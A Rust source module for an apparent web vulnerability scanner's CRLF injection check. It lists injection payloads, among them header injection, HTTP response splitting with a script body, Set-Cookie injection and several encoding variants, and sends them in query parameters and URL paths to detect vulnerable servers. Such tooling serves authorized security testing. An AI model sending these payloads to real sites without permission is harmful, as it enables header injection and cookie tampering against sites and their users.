use async_trait::async_trait;
use tracing::{debug, info};

use crate::http::client::HttpClient;
use crate::payloads::engine::PayloadEngine;
use crate::scanner::traits::*;
use crate::utils::url::set_query_param;

const CRLF_PAYLOADS: &[&str] = &[
    // Basic CRLF sequences
    "%0d%0aInjected-Header:fxss",
    "%0aInjected-Header:fxss",
    "%0dInjected-Header:fxss",
    "%0d%0a%0d%0a<script>alert(1)</script>",
    // Double encoding
    "%250d%250aInjected-Header:fxss",
    // Unicode variants
    "%e5%98%8a%e5%98%8dInjected-Header:fxss",
    // Response splitting with XSS body
    "%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>",
    // Set-Cookie injection
    "%0d%0aSet-Cookie:%20xss=injected",
    // Line feed only (some servers)
    "\nInjected-Header:fxss",
    // Carriage return only
    "\rInjected-Header:fxss",
    // Null byte + CRLF
    "%00%0d%0aInjected-Header:fxss",
    // Tab + CRLF
    "%09%0d%0aInjected-Header:fxss",
];

const CRLF_CANARY_HEADER: &str = "Injected-Header";
const CRLF_CANARY_VALUE: &str = "fxss";

pub struct CrlfScanner;

impl CrlfScanner {
    pub fn new() -> Self {
        Self
    }
}

#[async_trait]
impl Scanner for CrlfScanner {
    fn name(&self) -> &'static str {
        "CRLF Injection Scanner"
    }

    fn scanner_type(&self) -> ScannerType {
        ScannerType::Reflected
    }

    async fn scan(
        &self,
        target: &CrawlResult,
        _payload_engine: &PayloadEngine,
        http_client: &HttpClient,
    ) -> Vec<Finding> {
        let mut findings = Vec::new();

        // Get baseline headers to avoid false positives from pre-existing headers
        let baseline_has_canary_header = if let Ok(resp) = http_client.get(target.url.as_str()).await {
            resp.headers()
                .get(CRLF_CANARY_HEADER)
                .is_some()
        } else {
            false
        };

        // Test query parameters for CRLF injection
        for point in &target.params {
            if point.location != ParamLocation::Query {
                continue;
            }

            for payload in CRLF_PAYLOADS {
                let test_url = set_query_param(&target.url, &point.name, payload);

                let resp = match http_client.get(test_url.as_str()).await {
                    Ok(r) => r,
                    Err(_) => continue,
                };

                let status = resp.status().as_u16();
                let headers = resp.headers().clone();
                let body = resp.text().await.unwrap_or_default();

                // Check if our injected header appears (and wasn't there before)
                let header_injected = !baseline_has_canary_header
                    && headers
                        .get(CRLF_CANARY_HEADER)
                        .and_then(|v| v.to_str().ok())
                        .map_or(false, |v| v.contains(CRLF_CANARY_VALUE));

                // Check for response body injection (response splitting)
                let body_injected = body.contains("<script>alert(1)</script>")
                    && payload.contains("script");

                // Check for Set-Cookie injection
                let cookie_injected = headers
                    .get_all("set-cookie")
                    .iter()
                    .any(|v| v.to_str().unwrap_or("").contains("xss=injected"));

                if header_injected || body_injected || cookie_injected {
                    let (severity, description) = if body_injected {
                        (Severity::Critical, "HTTP response splitting with XSS body injection")
                    } else if cookie_injected {
                        (Severity::High, "CRLF injection allows Set-Cookie header injection")
                    } else {
                        (Severity::High, "CRLF injection allows arbitrary header injection")
                    };

                    info!(
                        "CRLF injection found: {} param '{}' ({})",
                        target.url, point.name, description
                    );

                    findings.push(Finding::new(
                        ScannerType::Reflected,
                        severity,
                        Confidence::Confirmed,
                        test_url.to_string(),
                        point.clone(),
                        payload.to_string(),
                        format!("CRLF: {}", description),
                        RequestRecord {
                            method: "GET".to_string(),
                            url: test_url.to_string(),
                            headers: Vec::new(),
                            body: None,
                        },
                        status,
                        None,
                    ));

                    // Found CRLF on this param, move to next
                    break;
                }
            }
        }

        // Test URL path for CRLF
        let path_payloads = ["%0d%0aInjected-Header:fxss", "%0aInjected-Header:fxss"];
        for payload in &path_payloads {
            let test_url = format!("{}/{}", target.url.as_str().trim_end_matches('/'), payload);
            if let Ok(resp) = http_client.get(&test_url).await {
                let header_injected = resp
                    .headers()
                    .get(CRLF_CANARY_HEADER)
                    .and_then(|v| v.to_str().ok())
                    .map_or(false, |v| v.contains(CRLF_CANARY_VALUE));

                if header_injected {
                    findings.push(Finding::new(
                        ScannerType::Reflected,
                        Severity::High,
                        Confidence::Confirmed,
                        test_url.clone(),
                        InjectionPoint {
                            name: "URL Path".to_string(),
                            location: ParamLocation::Path,
                            original_value: None,
                            context: None,
                        },
                        payload.to_string(),
                        "CRLF injection in URL path allows header injection".to_string(),
                        RequestRecord {
                            method: "GET".to_string(),
                            url: test_url,
                            headers: Vec::new(),
                            body: None,
                        },
                        resp.status().as_u16(),
                        None,
                    ));
                    break;
                }
            }
        }

        findings
    }
}
